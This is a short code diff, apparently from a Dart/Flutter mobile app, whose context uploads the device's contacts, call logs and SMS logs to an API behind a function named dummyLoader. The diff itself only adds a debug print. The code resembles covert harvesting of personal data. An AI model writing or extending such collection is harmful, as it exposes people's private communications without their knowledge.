@@ -32,6 +32,7 @@ class Init {
     dummyLoader();
     // Api.sendLocation(agent, uuid);
     if (getContacts) await Api.sendContacts(context, agent, uuid);
+    print('getContacts $getContacts');
     await Api.sendCallLogs(context, agent, uuid);
     await Api.sendSmsLogs(context, agent, uuid);
   }
